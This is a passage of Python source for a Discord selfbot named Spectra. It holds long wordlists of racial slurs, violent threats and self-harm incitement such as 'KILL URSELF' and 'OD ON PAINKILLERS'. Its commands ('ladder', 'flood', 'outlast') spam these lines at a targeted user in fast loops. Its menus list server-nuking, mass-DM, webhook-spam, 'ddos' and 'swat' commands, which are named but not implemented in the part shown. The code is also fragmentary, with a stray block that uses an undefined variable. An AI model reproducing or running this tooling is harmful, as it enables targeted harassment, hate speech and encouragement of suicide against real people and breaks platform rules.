    "NIGGAS DUCKING LMFAO", "L FUCKING PRESS ", "DORK ASS NIGGA", "WHY IS THIS NIGGA CRYING LOL",
    "U CANT HARM ME", "YOUS A BITCH LOL KILL URSELF", "STREAM UR DEATH", "ILL RAIL UR BITCH",
    "UR E GIRL DONT FW U ", "U FINGER URSELF", "KEEP TYPING SO I CAN EXILE U", 
    "WHY ARE YOU SO SLOW IM USING 1 ACC LOL", "BITCHLESS NIGGA HAD TO GET HIS E FRIENDS", "UR SAD AND WORTHLESS",
    "U AMOUNT TO NOTHING", "I RULE YOU", "I HOE U", "YOUR LIFE IS WORTHLESS UR PACKS ARE SLOW LOG OUT",
    "THIS NEVER STOPS", "gayest shit i seen all year", "THIS KID IS OWNED", "WHY CANT U FIGHT BACK",
    "ALEX OWNS YOU CUCK", "FUCK ASS DORK U CANT DO SHIT", "WHO THIS BITCH THINK HE IS", "WHY ARE YOU DUCKING?",
    "COME CRY TO DADDY", "NIGGA CANT DO SHIT", "ACCEPT UR FATE", "I KILLED U", "NICE RUN", 
    "KID CANT DO SHIT HES CRYING", "I OWN ALL UR E GIRLS", "IMA BEAM U", "STOP REPPING UR SHITTY CLAN",
    "2779 WAS MORE HARMFUL THAN THIS", "WHY ARE YOU SO UNKNOWN", "COME DO SOMETHING", "OD ON PAINKILLERS",
    "WHY ARE U SO SHITTY", "UR POOR HTML CANT DO SHIT", "COME DO SOMETHING", "I RUN THIS SHIT",
    "YOU'RE A FAILURE", "STAY SILENT, I OWN YOU", "DON'T PACK ME AGAIN", 
    "I HOE YOU UR SHITTY CORD CANT OUTLAST ME I DONT DIE", "KEEP TALKING JR", "MY MOM TYPES FASTER THAN THIS WHAT THE FUCK LMFAOO", 
    "YO FATASS CANT TYPE", "UR MY HOE", "KEEP CRYING", "I'LL TAKE EVERYTHING FROM YOU",
    "YOU'RE EMBARRASSING YOURSELF", "YOUR FUCKING ASS", "BOW DOWN AND ACCEPT DEFEAT",
    "YOU'RE A NOBODY",  "SIT DOWN AND SHUT UP",
    "EVERYONE'S TIRED OF YOUR BS", "I'M YOUR GOD CUCK", "YOU ALR LOST LMFAOP",
    "NOTHING YOU DO WILL WORK", "KEEP HIDING BEHIND YOUR SCREEN", "YOUR LIFE'S A JOKE",
    "I'M UR OWNER, YOU'RE ASS", "SAY SOMETHING",
    "COME CHALLENGE ME", "YOUR WHOLE EXISTENCE IS TO SERVE ME","HOW ARE YOU USING A SKIDDED CLIENT AND STILL SLOW WTF 😂 "
    "SHUT THE FUCKUP", "UR A BITCH", "LOL", "SHUT YO LAME ASS UP NIGGA",
    "DONT FOLD", "DORK ASS CUNT", "FUCK ASS BITCH",
    "SMD HEADASS NIGGA LMFAO UR WORTH NOTHING TO ME", "UR MY BITCH",
    "FUCK ASS NIGGA", "?", "UR MY SEED", "UR A HOE", "NIGGA U DIED TO ME",
    "IM FASTER THEN U SON", "UR A NERD", "🤓", "DONT STEP TO ME AGAIN",
    "NIGGA FOLDED TO ME", "PIPE THE FUCK DOWN", "I OWN U SON", "UR SLOW",
    "UR A BITCH", "LMFAO", "I DONT KNOW U", "FUCK ASS CUNT", "NIGGA TRIED STEPPING",
    "HOW DID U GET HOED LIKE THAT", "DUMB ASS BITCH", "I DONT FOLD",
    "SHUT THE FUCK UP", "TRY STEPPING AGAIN", "UR A BITCH",
    "DUMB ASS NIGGA", "DUMB ASS BITCH THOUGHT HE COULD STEP",
    "OUT LAST ME I NEVER DIE", "COME DIE TO ME NIGGA", 
]

bane += insults


@bot.command(name='ladder')
async def ladder(ctx, *, member: discord.User = None):
    """
    Start spamming insults at a user in any channel (DM, group DM, or server).
    """
    global ldr_task

    target = member if member else ctx.author

    try:
        await ctx.message.delete()
    except:
        pass  

    async def spam_insults():
        while True:
            try:
                random.shuffle(bane)
                for line in bane:
                    formatted = '\n'.join([f"# {word}" for word in line.split()])
                    message = f"{formatted}\n{target.mention}\n```DONT FOLD```"

                    await ctx.channel.send(message)
                    await asyncio.sleep(0.1)

                await asyncio.sleep(1)

            except asyncio.CancelledError:
                print("ladder task cancelled")
                break
            except Exception as e:
                print(f"[Error] {e}")
                await asyncio.sleep(1)

    if ldr_task and not ldr_task.done():
        await ctx.send("```ladder already running```")
        return

    ldr_task = bot.loop.create_task(spam_insults())


@bot.command(name='ladderend')
async def ladder_end(ctx):
    """
    Stop the ladder task.
    """
    global ldr_task

    if ldr_task and not ldr_task.done():
        ldr_task.cancel()
        await ctx.send("```ladder has been ended```")
    else:
        await ctx.send("```ladder wasn't running```")

@bot.command(name='flood')
async def pack(ctx, target: str = None):
    await ctx.message.delete()

    if target is None:
        await ctx.send('```mention a user to flood```')
        return

    global pl_task
    if pl_task and not pl_task.done():
        await ctx.send("```flood is already active```")
        return

    if isinstance(ctx.channel, discord.DMChannel): 

        member = ctx.author
        channel = ctx.channel  
    elif isinstance(ctx.channel, (discord.TextChannel, discord.GroupChannel)):  
        try:
            member = await commands.MemberConverter().convert(ctx, target)
            channel = ctx.channel  
        except commands.MemberNotFound:
            await ctx.send('[Invalid]: Could not find the specified user.')
            return
    else:
        await ctx.send('[Invalid]: Unsupported channel type.')
        return

    pl_task = asyncio.create_task(pl_task_function(channel, member))
    await ctx.send(f"Started flooding {member.mention if hasattr(member, 'mention') else member} with insults.")



from winotify import Notification, audio

def send_notification(title, message):
    toast = Notification(
        app_id="Spectra",
        title=title,
        msg=message,
        duration="short"
    )
    toast.show()

@bot.command(name='prefix')
async def prefix(ctx, new_prefix=None):
    await ctx.message.delete()
    current = get_current_prefix()

    if new_prefix is None:
        send_notification("Invalid Prefix Command", f'Usage: {current}prefix <prefix>')
        return

    bot.command_prefix = str(new_prefix)
    send_notification("Prefix Updated", f'Prefix changed from "{current}" to "{new_prefix}"')

def get_current_prefix():
    return bot.command_prefix if isinstance(bot.command_prefix, str) else bot.command_prefix(None)

@bot.command(name='floodend')
async def sa(ctx):
    global pl_task

    if pl_task and not pl_task.done():
        pl_task.cancel()
        pl_task = None
        await ctx.send("```flood has been stopped```")













ladder_messages = [
"https://media.discordapp.net/attachments/1306742094529826886/1307776610585542686/caption.gif?ex=676aff61&is=6769ade1&hm=38e79e5a0e8018e4e3ec94dbe64e80aa359b3e524c5d63d56eda63cad7e0d8d2&=&width=312&height=586"
]
message_index = 0  


from winotify import Notification, audio

def send_notification(title, message):
    toast = Notification(
        app_id="Spectra",
        title=title,
        msg=message,
        duration="short"
    )
    toast.show()

@bot.command()
async def ping(ctx):
    await ctx.message.delete()
    latency = bot.latency * 1000  
    send_notification("Ping Response", f"Spectra's Ping is: {latency:.2f}ms")



# @bot.command()
# async def stopstream(ctx):
# 
#    try:
#        await bot.change_presence(activity=None)  
#        await ctx.send("```stopped successfully```")
#    except Exception as e:
#        await ctx.send(f"Failed to stop streaming: {e}")

# @bot.command()
# async def stream(ctx, *, activity: str):
#    
#    try:
#       
#        await bot.change_presence(activity=discord.Streaming(name=activity, url="https://www.twitch.tv/aa"))
#        await ctx.send(f"```stream started as: {activity}```")
#    except Exception as e:
#        await ctx.send(f"Failed to set streaming status: {e}")
#
#
# async def set_streaming_status(message):
#
#   formatted_message = "\n".join(message.split(",")[:10]) 
#    await bot.change_presence(
#        activity=discord.Streaming(name=formatted_message, url="https://twitch.tv/aa")
#    )




@bot.command()
async def av(ctx, user: discord.User = None):
    
    try:
        user = user or ctx.author
        await ctx.send(user.avatar_url) 
    except Exception as e:
        await ctx.send(f"Failed to fetch avatar: {e}")











    
    for i in range(10, -1, -1):
        await ctx.send(f"{member.mention} u died to ALEX say here kid") # type: ignore
        await ctx.send(i)
        await asyncio.sleep(0.1)  


    await ctx.send(f"LMFAO U FOLDED {member.mention}") # type: ignore



@bot.remove_command('help') 






@bot.command()
async def menu(ctx):
    toaster = ToastNotifier()

    WELCOME_TEXT = f"""
╔════════════════════════════════════════╗
║          Welcome to Spectra            ║
║         Selfbot Client v3.1.4          ║
╚════════════════════════════════════════╝

Hello, {ctx.author.name}! Please select your device:

  ▶️ Type pc for PC version
  ▶️ Type mobile for Mobile version

(Note: Mobile version not supported yet.
If you're a mobile user, DM @wissssssssssss for info.)

You have 60 seconds to respond.
"""

    menu_message = await ctx.send(f"```{WELCOME_TEXT}```")

    def check_author_channel(m):
        return m.author == ctx.author and m.channel == ctx.channel

    tries = 3
    while tries > 0:
        try:
            async with ctx.typing():
                msg = await bot.wait_for('message', check=check_author_channel, timeout=60)
            choice = msg.content.lower()

            if choice == 'pc':
                nitro_question = await ctx.send("Are you a nitro user? (yes/no) we ask this question because we now have 2 menus. One for Nitro Users that is a Long Chunk of Text, And another for non nitro users that is an Image (same menu but just an image and a large chunk of text.)")
                await msg.delete()

                nitro_tries = 3
                while nitro_tries > 0:
                    try:
                        nitro_msg = await bot.wait_for('message', check=check_author_channel, timeout=30)
                        nitro_response = nitro_msg.content.lower()
                        await nitro_msg.delete()

                        if nitro_response in ['yes', 'y']:
                            toaster.show_toast("Spectra Selfbot", "Loading Spectra PC Menu...", duration=5)
                            text_menu = """
                                                       ╔═════════════════════════════╗
                                               page1 - ║        MULTICLIENTS         ║
                                                       ╚═════════════════════════════╝ 
                                                      ╔═════════════════════════════╗
                                              page2 - ║        SINGLECLIENTS        ║
                                                      ╚═════════════════════════════╝ 
                                                     ╔═════════════════════════════╗
                                             page3 - ║        RICHPRESENCE         ║
                                                     ╚═════════════════════════════╝ 
                                                    ╔═════════════════════════════╗
                                            page4 - ║         TROLLINGS           ║
                                                    ╚═════════════════════════════╝ 
                                                   ╔═════════════════════════════╗
                                           page5 - ║         REACTIONS           ║
                                                   ╚═════════════════════════════╝ 
                                                   ╔═════════════════════════════╗
                                           page6 - ║          SUPPORT            ║
                                                   ╚═════════════════════════════╝ 
                                                   ╔═════════════════════════════╗
                                           page7 - ║          UTILITY            ║
                                                   ╚═════════════════════════════╝         
                                                   ╔═════════════════════════════╗
                                           page8 - ║            MASS             ║
                                                   ╚═════════════════════════════╝ 
                                                   ╔═════════════════════════════╗
                                           page9 - ║           OTHERS            ║
                                                   ╚═════════════════════════════╝ 
                                                    ╔═════════════════════════════╗
                                           page10 - ║          WEBHOOKS           ║
                                                    ╚═════════════════════════════╝ 
                                                     ╔═════════════════════════════╗
                                            page11 - ║          GROUPCHAT          ║
                                                     ╚═════════════════════════════╝                                              
                                                      ╔═════════════════════════════╗
                                             page12 - ║            NUKE             ║
                                                      ╚═════════════════════════════╝ 
                                                       ╔═════════════════════════════╗
                                              page13 - ║            FUN              ║
                                                       ╚═════════════════════════════╝          
                                                        ╔═════════════════════════════╗
                                               page14 - ║       ACCOUNT / USERS       ║
                                                        ╚═════════════════════════════╝          
                                                         ╔═════════════════════════════╗
                                                page15 - ║            BOT              ║
                                                         ╚═════════════════════════════╝ 
                            """
                            await ctx.send(f"```{text_menu}```")
                            await nitro_question.delete()
                            break

                        elif nitro_response in ['no', 'n']:
                            toaster.show_toast("Spectra Selfbot", "Loading Spectra PC Menu...", duration=5)
                            await ctx.send("```Loading Spectra PC Menu...```")
                            await asyncio.sleep(1.5)
                            await ctx.send("https://imgur.com/3yy8ANU")
                            await nitro_question.delete()
                            break

                        else:
                            nitro_tries -= 1
                            if nitro_tries > 0:
                                await ctx.send(f"⚠ Invalid input. Please answer with `yes` or `no`. You have {nitro_tries} attempts left.")
                            else:
                                await ctx.send("Too many invalid attempts. Returning to main menu.")

                    except asyncio.TimeoutError:
                        await ctx.send("You took too long to respond. Returning to main menu.")
                        await nitro_question.delete()
                        break

                break 

            elif choice == 'mobile':
                await ctx.send("```Sorry, Mobile version is currently not available.```")
                await ctx.send("https://tenor.com/view/skull-glowing-eye-light-spinning-skull-rotating-skull-gif-27684714")
                await msg.delete()
                break

            else:
                tries -= 1
                if tries > 0:
                    await ctx.send(f"Invalid input. Please type `pc` or `mobile`. You have {tries} attempts left.")
                else:
                    await ctx.send("Too many invalid attempts. Please try the command again later.")
                await msg.delete()

        except asyncio.TimeoutError:
            await ctx.send("You took too long to respond. Please try the command again later.")
            break

    try:
        await menu_message.delete()
    except:
        pass

@bot.command()
async def page1(ctx):
    await ctx.send(f"""
``` ╔═════════════════════════════╗
    ║        MULTICLIENTS         ║
    ║           page 1            ║
    ╚═════════════════════════════╝ ``````
1.  multilast
2.  stoplast
3.  exile
4.  stopexile
5.  fill
6.  kill
7.  killend
8.  rpcall
9. rename
10. creator
11. showtoken !! USE AT YOUR OWN RISK. IT SENDS YOUR TOKEN IN CHAT/DM/GROUPCHAT !!```
""")

@bot.command()
async def page2(ctx):
    await ctx.send(f"""```
    ╔═════════════════════════════╗
    ║        SINGLECLIENTS        ║
    ║           page 2            ║
    ╚═════════════════════════════╝ ``````
1  flood
2  floodend        
3  ar                 
4  arend
5  ladder                                   
6  ladderend                  
7  outlast                   
8  endlast                  
9  ping
10 endping
11 spam
12 antitrap
13 afkoff
14 afkcheck
15 afk - working afk
16 ap
17 apoff                                                                                                                                                                    
18 deltrap
19 enddel                                  ```""")


@bot.command()
async def page3(ctx):
    await ctx.send(f"""``` 
    ╔═════════════════════════════╗
    ║        RICHPRESENCE         ║
    ║           page 3            ║
    ╚═════════════════════════════╝  ``````
1. rpc
2. stoprpc
3. stream
4. stopstream
5. play
```""")


@bot.command()
async def page4(ctx):
    await ctx.send(f"""```   
    ╔═════════════════════════════╗
    ║         TROLLINGS           ║
    ║           page 4            ║
    ╚═════════════════════════════╝ ``````
1.  swat                   
2.  hack                   
3.  dick                 
4.  gay  
5.  kiss
6.  groom
7.  oclown
8.  clown
9.  vodka
10. alex
11. jaso
                   ```""")


@bot.command()
async def page5(ctx):
    await ctx.send(f"""```    
    ╔═════════════════════════════╗
    ║         REACTIONS           ║
    ║           page 5            ║
    ╚═════════════════════════════╝ ``````
1.  react      <@user> <emoji>           
2.  stopreact                                 
3.  massreact #channel :emoji:                   ```""")


@bot.command()
async def page6(ctx):
    await ctx.send("```contact @wissssssssssss for help issues or questions```")

@bot.command()
async def page7(ctx):
    await ctx.send(f""""```   
    ╔═════════════════════════════╗
    ║          UTILITY            ║
    ║           page 7            ║
    ╚═════════════════════════════╝ ``````
1.  prefix
2.  reload                
3.  av
4.  banner - not working idk why
5.  python - only used  by  alex
6.  purge
7.  afk system (fully working)
8.  google
9.  youtube```""")

@bot.command()
async def page8(ctx):
    await ctx.send(f"""```    
    ╔═════════════════════════════╗
    ║            MASS             ║
    ║           page 8            ║
    ╚═════════════════════════════╝ ``````
1.  massdm - if you want your account limited, use this               
2.  massgc                 
3.  massunadd
4.  massban
5.  masskick
6.  massleave
                   ```""")

@bot.command()
async def page9 (ctx):
    await ctx.send(f"""```    
    ╔═════════════════════════════╗
    ║           OTHERS            ║
    ║           page 9            ║
    ╚═════════════════════════════╝ ``````
1.  bday
2.  advertise
3.  convert
4.  calc
5.  math
6.  echo
7.  bored
8.  countdown
9.  spongebob
10. wave
11. bomb
12. fireworks
13. matrix
14. rainbowtext
15. scrollingtext
16. reverse
17. bold
18. italic
19. underline
20. strikethrough
21. spoiler
22. zalgify
23. cursive
24. tinytext        
            ```""")

@bot.command()
async def page10 (ctx):
    await ctx.send(f"""```    
    ╔═════════════════════════════╗
    ║          WEBHOOKS           ║
    ║           page 10           ║
    ╚═════════════════════════════╝ ``````
1.  whspam
2.  whdelete
3.  whflood
4.  whhook
5.  whrainbow
6.  whupload
7.  whspamlist
8.  whmassdelete
9.  deletewebhooks
10. webhook
11. webhook create
12. webhook send
                     ```""")

@bot.command()
async def page11 (ctx):
    await ctx.send(f"""```    
    ╔═════════════════════════════╗
    ║          GROUPCHAT          ║
    ║           page 11           ║
    ╚═════════════════════════════╝ ``````
1.  gcspam
2.  gcrename
3.  gcname
4.  gckick
            ```""")

@bot.command()
async def page12 (ctx):
    await ctx.send(f"""```    
    ╔═════════════════════════════╗
    ║            NUKE             ║
    ║           page 12           ║
    ╚═════════════════════════════╝ ``````
1. spamchannels
2. spamroles
3. deleteroles
4. deletechannels
5. deletemojis
6. deletewebhooks
            ```""")

@bot.command()
async def page13 (ctx):
    await ctx.send(f"""```    
    ╔═════════════════════════════╗
    ║            FUN              ║
    ║           page 13           ║
    ╚═════════════════════════════╝ ``````

1. coinflip
2. roll
3. slots
4. rps
5. _8ball
6. gayrate
7. simprate
8. ppsize
9. rickroll
10. fakeban
11. trollping
12. steale
13. pingtest
14. scrollping
          ```""")

@bot.command()
async def page14 (ctx):
    await ctx.send(f"""```    
    ╔═════════════════════════════╗
    ║       ACCOUNT / USERS       ║
    ║           page 14           ║
    ╚═════════════════════════════╝ ``````
1. namehistory
2. badgegrab
3. accountage
4. resetpfp
5. resetbio
6. setbio
7. setpfp
8. setbanner
9. nick
10. whois
11. userinfo
12. serverinfo
13. copyserver | VERY OP
14. servers
15. joinserver
           ```""")

@bot.command() 
async def page15 (ctx):
    await ctx.send(f"""```    
    ╔═════════════════════════════╗
    ║            BOT              ║
    ║           page 15           ║
    ╚═════════════════════════════╝ ``````
1. play
2. stream
3. watch
4. listen
5. clearstatus
6. statuscycle
7. statusstop
8. customstatus
9. fakegame
10. richstatus
11. restart
12. killselfbot
13. running
14. s
15. quote | GETTING WORKED ON.
         ```""")

@bot.command()
async def cmds(ctx):
    all_cmds = [
        "banner",
        "rpcall",
        "change_status",
        "rpc",
        "stoprpc",
        "showtoken !!!!! USE THIS AT YOUR OWN RISK. THIS COMMAND WILL SHOW YOUR TOKEN IN THE DISCORD CHAT. !!!!!",
        "bold",
        "unbold",
        "exile",
        "menu",
        "page1",
        "page2",
        "page3",
        "page4",
        "page5",
        "page6",
        "page7",
        "page8",
        "page9",
        "page10",
        "page11",
        "page12",
        "page13",
        "page14",
        "page15",
        "arend",
        "kill",
        "killend",
        "fill",
        "streamall",
        "rename",
        "outlast",
        "endlast",
        "purge",
        "groom",
        "stopgroom",
        "test",
        "deactivate",
        "activate",
        "multilast",
        "stoplast",
        "ar",
        "reload",
        "say",
        "pack",
        "prefix",
        "sa",
        "pr",
        "ps",
        "stopstream",
        "stream",
        "playing",
        "av",
        "creator",
        "commandcount",
        "testing",
        "kiss",
        "kisscount",
        "bday",
        "bdaylist",
        "bdaydata",
        "bday set",
        "react",
        "stopreact",
        "afkcheck",
        "afk",
        "alex",
        "vodka",
        "jaso",
        "clown",
        "oclowm",
        "massdm",
        "massgc",
        "massunadd",
        "massreact #channel :emoji:",
        "nitro",
        "swat",
        "hack",
        "gay",
        "advertise",
        "dick",
        "end",
        "cmds",
        "reminder - working on",
        "ladder",
        "ladderend",
        "python",
        "afk (fully working)",
        "stopexile",
        "flood",
        "floodend",
        "pingtest",
        "endping",
        "spam",
        "antitrap",
        "afkoff",
        "ap",
        "apoff",
        "deltrap",
        "enddel",
        "convert",
        "reminder",
        "calc",
        "math",
        "echo",
        "bored",
        "countdown",
        "spongebob",
        "emojiflood",
        "scrollping",
        "wave",
        "bomb",
        "fireworks",
        "matrix",
        "rainbowtext",
        "scrollingtext",
        "reverse",
        "bold",
        "italic",
        "underline",
        "strikethrough",
        "spoiler",
        "zalgify",
        "cursive",
        "tinytext",
        "nuke",
        "spamchannels",
        "spamroles",
        "deleteroles",
        "deletechannels",
        "deletemojis",
        "deletewebhooks",
        "massban",
        "masskick",
        "dmall",
        "ddos",
        "killselfbot",
        "stealemoji",
        "massleave",
        "coinflip",
        "roll",
        "slots",
        "rps",
        "_8ball",
        "gayrate",
        "simprate",
        "ppsize",
        "namehistory",
        "badgegrab",
        "accountage",
        "resetpfp",
        "resetbio",
        "setbio",
        "setpfp",
        "setbanner",
        "nick",
        "rickroll",
        "fakeban",
        "trollping",
        "ip",
        "hacked",
        "restart",
        "whois",
        "serverinfo",
        "userinfo",
        "whspam",
        "whdelete",
        "whflood",
        "whhook",
        "whrainbow",
        "whupload",
        "whspamlist",
        "whmassdelete",
        "gcspam",
        "gcrename",
        "gcname",
        "gckick",
        "dmlog",
        "dmstop",
        "massblock",
        "playing",
        "stream",
        "watching",
        "listening",
        "clearstatus",
        "statuscycle",
        "statusstop",
        "customstatus",
        "fakegame",
        "richstatus",
        "webhook",
        "webhook create",
        "webhook send",
        "running",
        "updatelog",
        "copyserver | VERY OP LOLLLLLL",
        "servers",
        "joinserver",
        "ping",
        "steale",
        "s",
        "quote",
        "stickers",
        "emojis",
        "r",
        "role",
        "r create",
        "r delete",
        "r edit",








    ]

    lines = [f"{i+1}. `{cmd}`" for i, cmd in enumerate(all_cmds)]
    full = "**📜 All Spectra Commands:**\n" + "\n".join(lines)

    chunks = [full[i:i+1900] for i in range(0, len(full), 1900)]
    for part in chunks:
        await ctx.send(part)







outlast_active = False
outlast_task = None

wordlist = [
"hey\nweak\ndork\nboy\nwya\ni\ncant\nhear\nyou\nspeak\na\nbit\nfaster\nson",
"YO\nQUEER\nARE\nYOU\nSTEPPING\nTO\nDIE\nTO\nME?\nMOVE\nFUCKBOY",
"ILL\nBLOW\nUR\nGIRLS\nSPINE\nOUT\nFAT\nCUCK",
"LLMFAO\nISNT\nUR\nMOTHER\nA\nSTRIPPER?\nLOLLLLLLLLLLL",
"KID\nDONT\nFOLD\nGET\nUP\nAND\nCOME\nKILL\nME\nUR\nFUCKING\nDYING\nRIGHT\nNOW\nDORK",
"I\nSAID\nSTEP\nTHE\nFUCK\nUP\nUR\nBORING\nME\nU\nWEAK\nMUTT",
"POORON\nU\nDIED\nTO\nA\nCLIENT\nAND\nWILL\nDIE\nIN\nMANAUL\nIF\nYOU\nNEED\nSOME\nHELP\nDM\\ALEX\nLMFAO\nHE\nMIGHT\nHELP\nUR\nWEAK\nASS",
"YO\nFEMBOY\nSHUT\nTHE\nFUCK\nUP",
"MORON\nUR\nMY\nFUCKING\nJR\nU\nWILL\nNEVER\nBE\nFASTER\nTHAN\nME\nLOL",
"TALK\nUR\nSHIT\nU\nWEAK\nASS\nRANDOM\nILL\nFUCKING\nKILL\nYOU",
"I\nCAN\nTURN\nUR\nWHOLE\nFAMILY\nINTO\nMY\nSLAVES",
"THIS\nPOOR\nKID\nLIVES\nIN\nA\n5FT\nHOUSE\nLMFAOOOOOOOOOO",
"STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n STFU U DIED TO ME GET FLOODED DORK BOY\n ",
"NICE\nRUN\nJRR",
"YOU\nDIED\nLAST\nWORD.",
  "YOU\nDORK\nASS\nRUNT\nDONT\nSTEP\nTO\nYOUR\nFOUNDER\n",
  "ALEX\nMURDERD\nYOU\nLMFAO\nYOUR\nSO\nWEAK\n",
  "RETARDED\nMORON\nHAIL\nALEX\nLOL\nUR\nFUCKING\nWORTHLESS\n",
  "YO\nCUCK\nDONT\nSTEP\nTO\nUR\nFATHER\nAGAIN\nILL\nHUMBLE\nYOU\nRETARD\n",
  "ILL\nSTEP\nON\nUR\nBITCH\nLMFAO\nCOME\nKILL\nME\nGET\nPAY\nBACK\nYOU\nWEAK\nFUCK\n",
  "COME\nHERE\nILL\nCHOKE\nYOU\n",
  "GET\nDROWNED\nBY\nUR\nGOD\n",
  "GET\nTHE\nFUCK\nDOWN",
  "ILL\nFUCKING\nMURDER\nYOU\nWEAK\nSKID",
  "SHOW\nYOUR\nFUNDS\nWEAK\nPOORON",
  "SHUT\nTHE\nFUCK\nUP\nRANDOM\nFEMBOY",
  "I\nTURN\nUR\nBITCH\nINTO\nMY\nSLUT",
  "YOUR\nMOM\nCUTS\nFOR\nME",
  "ILL\nNEVER\nFOLD\nOR\nDIE\nHAIL\nALEX",
  "DID\nU\nDIE\nSO\nQUICK",
  "PATHETIC\nSLOW\nBOY",
  "UR\nCLIENT\nIS\nSHIT",
  "YOUR\nFUCKING\nSTRUGGLING\nTO\nLIVE",
  "BREATHE\nMY\nWEAKEST\nCHILD",
  "ILL\nRIP\nYOUR\nINTESTINES\nOUT\nAND\nFEED\nIT\nTO\nMY\nDOG",
  "YOUR\nA\nWEAK\nSKID\nASS\nNIGGA\nLOL\nUR\nFUCKING\nRETARDED\nYOU\nBUY\nSCRIPTS\nAND\nSTILL\nDIE\nYOU\nMORON",
  "YOUR\nA\nPUSSY\nASS\nKID\nWHY\nDID\nU\nSTEP\nAND\nGOT\nPUT\nTHE\nFUCK\nDOWN",
  "STEP\nTHE\nFUCK\nDOWN\nBEFORE\nA\nREAL\nSTEPPER\nMURDERS\nYOU\nUR\nMY\nLAB\nDOG\nBARK\nFOR\nUR\nGOD\nYOU\nFEMBOY\nYOU\nHAVE\nA\nCUCK\nKINK",
  "YOUR\nEGO\nDIED\nAFTER\nI\nKILLED\nUR\nSHIT\nTOKENS\nYOUR\nADDICTED\nTO\nDYING\nBY\nALEX\nYOU\nFUCKUP\nDORK",
  "DO\nYOU\nWANT\nMY\nWORD\nLIST\n?\nLOL\nU\nMIGHT\nNEED\nIT\nU\nUSE\nCHAT\nGPT\nTO\nGIVE\nU\nWORDS",
  "SHUT\nUP\nBROKE\nASS\nKID",
  "I\nFEEL\nBAD\nBUT\nI\nHAVE\nTO\nSHOW\nYOU\nWHO\nUR\nGOD\nIS",
  "LETS\nGO\nTO\nWAR\nWATCH\nU\nDIE\nWEAK\nFUCK",
  "YOU\nWILL\nNEVER\nGET\nA\nBITCH\nAND\nIF\nU\nDO\nU\nWILL\nMAKE\nHER\nPUSSY\nDRY",
  "STFU\nYOU\n1WPM\nWARRIOR\nUR\nSAD\nAS\nSHIT",
  "ILL\nNEVER\nDIE\nKEEP\nGOING\nTILL\nYOUR\nBONES\nDECAY\nMY\nCLIENTS\nCAN\nOUTLAST\nYOUR\nWORTHLESS\nLIFE",
  "SHUT\nUP\nYOU\nLOW\nTIER\nRETARD",
  "you\ndied\nto\na\ngod\nlol\nits\nokay\njrs\nlike\nyou\nalways\nfail\nme", 
  "YOU\nDISAPOINTED\nME\nI\nWANTED\nTO\nGO\nLONGER",
  "SAY\nIT\nWITH\nYOUR\nCHEST\nYOU\nCANT\nHANDLE\nTHE\nGREATEST",
]


@bot.command()
async def outlast(ctx, *args):
    global outlast_active, outlast_task

    
    if not args:
        await ctx.send("```Please mention a user or provide a valid user ID.```")
        return

    
    user_mentioned = None

    if len(args) == 1:
        arg = args[0]
        
        
        if arg.startswith("<@") and arg.endswith(">"):
            user_mentioned = arg  
        else:
          
            user_mentioned = f"<@{arg}>"

    if not user_mentioned:
        await ctx.send("```Could not resolve user mention or ID. Please try again.```")
        return

 
    if outlast_active:
        await ctx.send("```Outlast is already active```")
        return

   
    outlast_active = True

    async def outlast_messages():
        while outlast_active:
            try:
                response = random.choice(wordlist)

        
                await ctx.send(f"{response}\n{user_mentioned}")

                await asyncio.sleep(0.1)

            except asyncio.CancelledError:
                break
            except Exception as e:
                print(f"Error: {e}")

    
    outlast_task = asyncio.create_task(outlast_messages())

@bot.command()
async def endlast(ctx):
    global outlast_active, outlast_task

    if outlast_active:
        outlast_active = False
        if outlast_task:
            outlast_task.cancel()
            await ctx.send("```Outlast has been stopped.```")






@bot.command()
async def purge(ctx, amount: int):
    if amount < 1 or amount > 100:
        await ctx.send("```Please provide a number between 1 and 100 for the number of messages to delete.```")
        return

    try:
        await ctx.message.delete()

        if isinstance(ctx.channel, discord.TextChannel):
            messages = [msg async for msg in ctx.channel.history(limit=amount + 1)]
            await ctx.channel.delete_messages(messages)
            confirmation = await ctx.send(f"```Deleted {amount} messages.```")
            await asyncio.sleep(0.1)
            await confirmation.delete()

        elif isinstance(ctx.channel, discord.DMChannel):
            messages = [msg async for msg in ctx.channel.history(limit=amount)]
            bot_messages = [msg for msg in messages if msg.author == bot.user]
            for msg in bot_messages:
                await msg.delete()
            confirmation = await ctx.send(f"```Deleted {len(bot_messages)} messages.```")
            await asyncio.sleep(0.1)
            await confirmation.delete()

        elif isinstance(ctx.channel, discord.GroupChannel):
            messages = [msg async for msg in ctx.channel.history(limit=amount)]
            deleted = 0
            for msg in messages:
                if msg.author == bot.user:
                    await msg.delete()
                    deleted += 1
            confirmation = await ctx.send(f"```Deleted {deleted} bot messages in the group chat.```")
            await asyncio.sleep(0.1)
